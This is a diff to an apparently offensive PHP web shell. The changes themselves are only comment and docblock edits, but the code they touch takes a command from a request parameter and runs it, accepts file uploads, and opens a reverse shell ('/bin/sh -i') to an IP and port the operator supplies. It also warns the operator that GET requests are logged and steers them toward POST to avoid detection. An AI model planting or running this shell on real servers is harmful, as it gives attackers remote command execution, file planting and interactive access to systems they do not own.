@@ -19,8 +19,8 @@ $this_file = __FILE__;
 // parameter.
 $cmd = 'cmd';
 
-// name of the parameter (POST) for the uploaded file.
-// change   this  if  the  target   already   use  this
+// name of the parameter  (POST) for the uploaded file.
+// change  this   if  the   target  already   use  this
 // parameter.
 $file = 'file';
 
@@ -34,15 +34,15 @@ $ip = 'ip';
 // this parameter.
 $port = 'port';
 
-// test if  parameter 'cmd', 'ip or  'port' is present.
-// if not  this will avoid an  error on logs or  on all
-// pages if badly configured.
-
 // warn about noisy get requests
 if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    echo "\e[0;33mWarning\e[0m: \e[0;31mGET\e[0m requests are most likely logged,";
    echo " better use \e[0;32mPOST\e[0m instead\n\n";
 }
+
+// test if  parameter 'cmd', 'ip or  'port' is present.
+// if not  this will avoid an  error on logs or  on all
+// pages if badly configured.
 
 if (isset($_REQUEST[$cmd])) {
    // grab the  command we want  to run from  the 'cmd'
@@ -123,6 +123,13 @@ function executeCommand(string $command)
    return false;
 }
 
+/**
+ * open a reverse shell using the given parameters
+ *
+ * @param string $ip ip address to use
+ * @param string $port port use
+ * @return string|false error message if an error happened, false otherwise
+ */
 function openReverseShell(string $ip, string $port)
 {
    $command = '/bin/sh -i <&3 >&3 2>&3';
@@ -140,6 +147,12 @@ function openReverseShell(string $ip, string $port)
    return false;
 }
 
+/**
+ * check whether there is an ongoing upload.
+ *
+ * @param mixed $upload variable from `$_FILES`
+ * @return bool whether to handle a file upload
+ */
 function isRequestFileUpload($upload)
 {
    if (empty($upload)) {
@@ -156,6 +169,12 @@ function isRequestFileUpload($upload)
    return true;
 }
 
+/**
+ * handle a file upload
+ *
+ * @param array $upload value from `$_FILES[...]`
+ * @return string|false error message if an error happened, false otherwise
+ */
 function handleFileUpload(array $upload)
 {
    if (!empty($upload['error'])) {
